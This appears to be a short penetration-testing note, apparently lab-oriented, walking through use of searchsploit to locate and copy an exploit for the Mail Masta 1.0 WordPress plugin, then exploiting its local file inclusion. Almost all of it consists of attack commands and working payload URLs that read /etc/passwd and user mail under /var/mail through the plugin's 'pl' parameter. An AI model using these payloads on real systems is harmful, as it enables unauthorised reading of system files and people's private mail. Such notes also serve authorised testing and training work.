Search for any vulnerabilities:
```
# searchsploit <vulnerableName Version>
searchsploit mail-masta 1.0
```

To copy the exploit to your current dir, run:
```
searchsploit -m php/webapps/40290.txt
```

Now see what is in the file:
```
cat 40290.txt
```

In this example, it tells you to navigate to this path to test the exploit:
```
http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd 
```

Using this LFI, try checking out mail log for example:
```
http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/

OR

http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/<username>
```
